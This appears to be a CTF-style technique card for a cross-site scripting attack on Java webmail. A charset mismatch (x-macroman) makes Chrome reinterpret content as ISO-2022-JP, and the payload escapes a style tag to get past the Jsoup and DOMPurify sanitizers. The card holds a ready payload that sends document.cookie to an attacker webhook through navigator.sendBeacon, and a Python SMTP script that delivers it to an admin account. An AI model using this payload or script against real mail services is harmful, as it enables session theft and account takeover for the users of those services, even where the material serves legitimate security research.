---
name: charset_mismatch_iso2022jp_xss
vuln_type: xss
sub_technique: charset_mismatch
category: exploitation
safety_level: safe
---

# Charset Mismatch Xss — Server-Side Charset Unsupported By Browser Triggers Auto-Detection To Iso-2022-Jp

## When to Apply

A web application reads email/content bodies using Java's `message.getContent()` which decodes using the Content-Type charset, then sanitizes HTML (Jsoup + DOMPurify). The sanitized content is served with the same charset in the response Content-Type header. If the attacker specifies a charset that Java supports but Chrome does not recognize (e.g., `x-macroman`), Chrome falls back to charset auto-detection. By embedding ISO-2022-JP escape sequences (`\x1b(J`) in the content, Chrome auto-detects the encoding as ISO-2022-JP, causing byte sequences to be reinterpreted differently than the server-side sanitizers expected, breaking out of string or tag contexts to achieve XSS.

## Prerequisites

- Server uses Java mail API (message.getContent()) with charset-based decoding
- Server-side HTML sanitization (Jsoup Safelist + DOMPurify) operates on decoded content
- Response Content-Type includes the email's charset directly (charset= from mail header)
- Java supports the chosen charset (e.g., x-macroman, x-mac-roman) but Chrome < 139 does not
- Chrome auto-detection feature for unrecognized charsets (ICU CharsetDetector)
- ISO-2022-JP escape sequences survive sanitization (e.g., inside <style> or attribute values)
- Admin bot (Puppeteer/Playwright with Chromium) opens the email content page
- Sensitive data (flag/cookie) accessible via document.cookie or similar

## Steps

1. Register a user on the webmail service
2. Craft email via SMTP with:
   - `Content-Type: text/html; charset=x-macroman`
   - `Content-Transfer-Encoding: base64`
   - Body containing ISO-2022-JP escape `\x1b(J` inside `<style>` tag
3. Payload: `<style>\x1b(J'";navigator.sendBeacon('WEBHOOK',document.cookie);//</style>`
4. Server processing:
   - Java decodes body as x-macroman (supported) → `\x1b(J` becomes harmless bytes
   - Jsoup sanitizes: `<style>` tag allowed, content appears safe (no script tags)
   - DOMPurify sanitizes: same — appears safe in context
   - Response served with `Content-Type: text/html; charset=x-macroman`
5. Chrome rendering:
   - Does not recognize `x-macroman` → triggers charset auto-detection
   - ICU detects ISO-2022-JP due to escape sequence `\x1b(J`
   - Content reinterpreted under ISO-2022-JP encoding
   - `\x1b(J` switches to JIS X 0201 Roman mode → following bytes reinterpreted
   - Breaks out of `<style>` context → executes JavaScript
6. XSS fires: cookie/flag exfiltrated via sendBeacon to attacker webhook

## Code Template

```
import smtplib, base64\ncontent = b'<style>\x1b(J\'";navigator.sendBeacon(`WEBHOOK`,document.cookie);//</style>'\nencoded = base64.b64encode(content).decode()\nmessage = f'From: {email}\\nTo: admin@target.com\\n'\nmessage += f'Subject: x\\nContent-Type: text/html; charset=x-macroman\\n'\nmessage += f'Content-Transfer-Encoding: base64\\n\\n{encoded}'\nserver = smtplib.SMTP(smtp_host, 25)\nserver.login(email, password)\nserver.sendmail(email, 'admin@target.com', message)
```

## Examples

### Example 1

- **java_charset**: x-macroman (supported by Java, not by Chrome)
- **browser_charset**: Chrome < 139 auto-detects ISO-2022-JP from \x1b(J escape
- **escape_sequence**: \x1b(J — ISO-2022-JP escape to JIS X 0201 Roman
- **sanitizers_bypassed**: Jsoup (server-side) + DOMPurify 3.2.6 (client-side)
- **injection_context**: <style> tag (allowed by Jsoup Safelist.relaxed().addTags('style'))
- **exfil_method**: navigator.sendBeacon(webhook, document.cookie)

This is a charset encoding differential attack. The key insight is that Java and Chrome support different sets of charsets. Java supports x-macroman (Mac OS Roman) but Chrome does not recognize it, causing Chrome to fall back to ICU charset auto-detection. The ISO-2022-JP escape sequence \x1b(J embedded in the content triggers auto-detection. In ISO-2022-JP, \x1b(J switches to JIS X 0201 Roman mode where certain bytes map to different characters, effectively reinterpreting the sanitized HTML/JS and breaking out of the <style> context. Chrome 139+ may have fixed auto-detection behavior. Alternative Java-only/browser-unsupported charsets: x-MacRoman, x-MacCyrillic, etc.
